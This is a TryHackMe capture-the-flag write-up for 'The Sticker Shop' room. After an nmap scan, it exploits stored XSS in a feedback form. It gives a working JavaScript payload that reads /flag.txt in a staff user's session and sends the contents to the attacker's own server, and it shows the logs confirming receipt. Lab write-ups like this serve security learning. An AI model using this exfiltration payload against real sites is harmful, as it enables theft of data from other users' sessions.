---
title: "TryHackMe: The Sticker Shop"
author: jaxafed
categories: [TryHackMe]
tags: [web, xss, js]
render_with_liquid: false
media_subpath: /images/tryhackme_the_sticker_shop/
image:
  path: room_image.webp
---

**The Sticker Shop** was a very simple room about exploiting a **Cross-Site Scripting (XSS)** vulnerability to steal the contents of a page and retrieve the flag.

[![Tryhackme Room Link](room_card.webp){: width="300" height="300" .shadow}](https://tryhackme.com/r/room/thestickershop){: .center }

## Initial Enumeration

### Nmap Scan

We start with an `nmap` scan.

```console
$ nmap -T4 -n -sC -sV -Pn -p- 10.10.222.154
Nmap scan report for 10.10.222.154
Host is up (0.082s latency).
Not shown: 65533 closed tcp ports (reset)
PORT     STATE SERVICE    VERSION
22/tcp   open  ssh        OpenSSH 8.2p1 Ubuntu 4ubuntu0.9 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 b2:54:8c:e2:d7:67:ab:8f:90:b3:6f:52:c2:73:37:69 (RSA)
|   256 14:29:ec:36:95:e5:64:49:39:3f:b4:ec:ca:5f:ee:78 (ECDSA)
|_  256 19:eb:1f:c9:67:92:01:61:0c:14:fe:71:4b:0d:50:40 (ED25519)
8080/tcp open  http-proxy Werkzeug/3.0.1 Python/3.8.10
|_http-server-header: Werkzeug/3.0.1 Python/3.8.10
|_http-title: Cat Sticker Shop
...
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

There are two ports open:

- **22** (`SSH`)  
- **8080** (`HTTP`)

### Web 8080

Visiting `http://10.10.222.154:8080/`, we see a simple page displaying some stickers and their prices.

![Web 8080 Index](web_8080_index.webp){: width="1200" height="600"}

While there is no functionality to purchase the stickers, it appears we can leave feedback at `http://10.10.222.154:8080/submit_feedback`.

![Web 8080 Submit Feedback](web_8080_submit_feedback.webp){: width="1200" height="600"}

After submitting feedback, we receive a message stating that a staff member will review it shortly.

![Web 8080 Submit Feedback Message](web_8080_submit_feedback_message.webp){: width="1200" height="600"}

The room also specifies that our goal is to read the flag located at `http://10.10.222.154:8080/flag.txt`. However, making a request to this endpoint returns a `401 Unauthorized` response.

![Web 8080 Flag](web_8080_flag.webp){: width="1200" height="600"}

## Obtaining the Flag

### Discovering the XSS

Going back to the **Feedback** page and testing the form for Cross-Site Scripting (**XSS**) with a simple payload like `<img src="http://10.11.72.22/test" />` and starting a basic HTTP server to confirm the vulnerability, we can see that we are successful as we see a request in our web server.

![Web 8080 Submit Feedback Xss](web_8080_submit_feedback_xss.webp){: width="1200" height="600" }

```console
$ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.222.154 - - [01/Dec/2024 06:44:39] code 404, message File not found
10.10.222.154 - - [01/Dec/2024 06:44:39] "GET /test HTTP/1.1" 404 -
```

### Stealing Page Contents

Our goal is still to access the contents of the `http://10.10.222.154:8080/flag.txt` page, and while we don't have access to it, we can consider the possibility that the staff user might.

Since we already discovered a Cross-Site Scripting (**XSS**) vulnerability potentially affecting a staff user that allows us to run `JavaScript` code in their session, we can exploit this vulnerability to obtain the contents of the `http://10.10.222.154:8080/flag.txt` page.

To achieve this, we will first write a `JavaScript` code that makes a request to the `/flag.txt` endpoint and sends the contents back to our server upon receiving a response, as shown below:

```js
var target_url = "/flag.txt";
var my_server = "http://10.11.72.22/data";
var xhr  = new XMLHttpRequest();
xhr.onreadystatechange = function() {
    if (xhr.readyState == XMLHttpRequest.DONE) {
        fetch(my_server + "?" + xhr.responseText)
    }
}
xhr.open('GET', target_url, true);
xhr.send(null);
```

Now, all we have to do is send our payload wrapped in `script` tags through the feedback form to make it execute in the staff user's session.

![Web 8080 Submit Feedback XSS Two](web_8080_submit_feedback_xss2.webp){: width="1200" height="600"}

After submitting the feedback with the payload, as we can see, we receive the flag on our web server and complete the room.

```console
10.10.222.154 - - [01/Dec/2024 06:59:29] code 404, message File not found
10.10.222.154 - - [01/Dec/2024 06:59:29] "GET /data?THM{83[REDACTED]e6} HTTP/1.1" 404 -
```

<style>
.center img {        
  display:block;
  margin-left:auto;
  margin-right:auto;
}
.wrap pre{
    white-space: pre-wrap;
}
</style>
